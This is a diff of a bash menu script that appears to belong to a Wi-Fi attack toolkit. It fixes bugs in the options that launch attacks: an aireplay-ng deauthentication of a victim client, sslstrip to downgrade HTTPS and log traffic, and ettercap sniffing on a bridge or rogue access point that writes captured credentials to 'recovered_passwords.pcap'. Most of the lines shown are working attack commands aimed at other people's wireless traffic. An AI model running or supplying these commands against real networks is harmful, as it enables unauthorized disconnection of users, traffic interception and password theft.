@@ -81,7 +81,7 @@ menu()
         get_name "STATION="; STATION=$USE
         get_name "IFACE1="; IFACE1=$USE
         MON="${IFACE1}mon"
-        sudo xterm -bg black -fg blue -T "Aireplay" -geometry 90x20 -e aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION $IFACE1mon &>/dev/null &
+        sudo xterm -bg black -fg blue -T "Aireplay" -geometry 90x20 -e aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon &>/dev/null &
     elif [[ $choice == 8 ]]; then
         echo -e "SSL Strip Log File\n" > $sessionfolder/ssl.log
     	sudo xterm -T "SSL Strip" -geometry 35x10 -e sslstrip -p -l 8080 -k -f lock.ico -w $sessionfolder/ssl.log &>/dev/null &
@@ -90,13 +90,13 @@ menu()
         get_name "BRIDGE_NAME="; BR_NAME=$USE
         get_name "AP="; AP_NAME=$USE
         get_name "BRIDGED="; BRIDGED=$USE
-        sudo touch $sessionfolder/recovered_passwords.pcap
+        [[ ! -f $sessionfolder/recovered_passwords.pcap ]] && sudo touch $sessionfolder/recovered_passwords.pcap
         if [[ $BRIDGED == "True" ]]; then
-    	   sudo xterm -T "ettercap $BR_NAME" -geometry 90x20 -e ettercap -Tzq -i $BR_NAME -w /tmp/n4p/recovered_passwords.pcap &>/dev/null &
+    	   sudo xterm -T "ettercap $BR_NAME" -geometry 90x20 -e ettercap -Tzq -i $BR_NAME -w $sessionfolder/recovered_passwords.pcap &>/dev/null &
         elif [[ $AP_NAME == "AIRBASE" ]]; then
-           sudo xterm -T "ettercap at0" -geometry 90x20 -e ettercap -Tzq -i at0 -w /tmp/n4p/recovered_passwords.pcap &>/dev/null &
+           sudo xterm -T "ettercap at0" -geometry 90x20 -e ettercap -Tzq -i at0 -w $sessionfolder/recovered_passwords.pcap &>/dev/null &
         elif [[ $AP_NAME == "HOSTAPD" ]]; then
-           sudo xterm -T "ettercap $IFACE1" -geometry 90x20 -e ettercap -Tzq -i $IFACE1 -w /tmp/n4p/recovered_passwords.pcap &>/dev/null &
+           sudo xterm -T "ettercap $IFACE1" -geometry 90x20 -e ettercap -Tzq -i $IFACE1 -w $sessionfolder/recovered_passwords.pcap &>/dev/null &
         fi
     elif [[ $choice == 10 ]]; then
         get_name "IFACE1="; IFACE1=$USE
